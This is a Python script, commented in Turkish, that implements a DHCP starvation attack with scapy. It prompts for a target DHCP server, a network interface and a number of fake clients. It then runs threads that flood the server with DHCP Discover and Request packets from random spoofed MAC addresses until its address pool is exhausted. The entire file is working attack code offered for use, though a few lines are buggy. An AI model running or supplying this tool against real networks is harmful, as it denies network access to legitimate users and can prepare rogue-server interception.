import signal
import subprocess
import sys
import threading

from scapy.all import *
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether, ARP
from datetime import datetime
import logging
import warnings
warnings.filterwarnings("ignore", category=CryptographyDeprecationWarning)

# Çıkış durumunu yönetmek için bir işaretçi
running = True

logging.basicConfig(filename='dhcp_starvation_attack.log', level=logging.INFO,  format='%(asctime)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S')

def logEvent(event):
    logging.info(event)

def restoreF(i_face):
    global ori_mac
    if ori_mac:
        # MAC adresini düzeltmek için fonksiyon
        subprocess.run(['ifconfig', i_face, 'hw', 'ether', ori_mac])
        logEvent(f"Arayüz MAC orijinal halinde döndürüldü: {ori_mac}")
        print("Ağ ayarları geri yüklendi.")

def handle_exit(signal, frame):
    global running
    print("\nSaldırı durduruldu. Çıkış yapılıyor...")
    running = False
    restoreF(iface)
    sys.exit(0)

# Çıkışı işlemek için sinyal işleyiciyi tanımla
signal.signal(signal.SIGINT, handle_exit)
signal.signal(signal.SIGTERM, handle_exit)

def dhcp_discover(spoofed_mac, i_face):
    ip_dest = '255.255.255.255'
    mac_dest = "ff:ff:ff:ff:ff:ff"
    dsc = Ether(src=spoofed_mac, dst=mac_dest)
    dsc /= IP(src='0.0.0.0', dst=ip_dest)
    dsc /= UDP(sport=68, dport=67)
    dsc /= BOOTP(chaddr=spoofed_mac, xid=random.randint(1, 1000000000), flags=0xFFFFFF)
    dsc /= DHCP(options=[("message-type", "discover"), "end"])
    sendp(dsc, iface=i_face)
    logEvent(f"DHCP Discover gönderildi - MAC:{spoofed_mac}")

def dhcp_starvation_TH(mac, target_ip, i_face):
    while running:
        dhcp_discover(spoofed_mac=mac, i_face=i_face)
        pkt = sniff(count=1, filter="udp and (port 67 or 68)", timeout=3)
        if pkt and DHCP in pkt[0] and pkt[0][DHCP].options[0][1] == 2:
            ip = pkt[0][BOOTP].yiaddr
            dhcp_request = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
            dhcp_request /= IP(src="0.0.0.0", dst='255.255.255.255')
            dhcp_request /= UDP(sport=68, dport=67)
            dhcp_request /= BOOTP(chaddr=mac, xid=random.randint(1, 1000000000))
            dhcp_request /= DHCP(options=[("message-type", "request"), ("server_id", target_ip), ("requested_addr", ip), "end"])
            sendp(dhcp_request, iface=i_face)
            logEvent(f"{ip} için DHCP Request gönderildi")

def simulate_multiCli(client_n, target_ip, i_face):
    thread_s = []
    for _ in range(client_n):
        mac = RandMAC()
        thread_n = threading.Thread(target=dhcp_starvation_TH, args=(mac, target_ip, i_face))
        thread_s.append(thread_n)
        thread_n.start()
    for thread_n in thread_s:
        thread_n.join()

if __name__ == "__main__":
    target_ip = input("Hedef DHCP sunucusunun IP adresini girin: \n")
    interfaces = get_if_list()
    print("Mevcut ağ arayüzleri:\n")
    for index, iface in enumerate(interfaces):
        print(f"{index}: {iface}")
    iface_index = input("Saldırıyı gerçekleştireceğiniz ağ arayüzünü girin : \n")
    iface =interfaces[iface_index]

    client_n = int(input("Kaç tane istemci üzerinden saldırıyı başlatmak istersiniz?\n"))

    ori_mac = get_if_hwaddr(iface)
    print(f"Orijinal MAC adresi: {ori_mac}")
    simulate_multiCli(client_n, target_ip, iface)
